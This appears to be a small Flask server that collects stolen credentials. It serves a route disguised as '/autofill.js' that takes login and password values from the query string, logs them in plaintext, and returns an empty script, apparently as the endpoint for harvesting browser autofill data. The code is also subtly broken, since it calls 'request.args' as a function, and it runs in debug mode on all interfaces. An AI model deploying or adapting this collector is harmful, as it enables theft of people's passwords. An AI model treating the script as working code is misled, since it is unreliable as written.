from flask import Flask
from flask import Response
from flask import request
import logging

logging.basicConfig(filename="mwsec_server.log", level=logging.DEBUG)

app = Flask(__name__)

@app.route("/autofill.js")
def index():
    login = request.args("login")
    password = request.args("pass")
    logging.info("Got login '%s', password '%s'", login, password)
    return Response("{}", mimetype="application/x-javascript")

app.run(host="0.0.0.0", port=8080, debug=True)
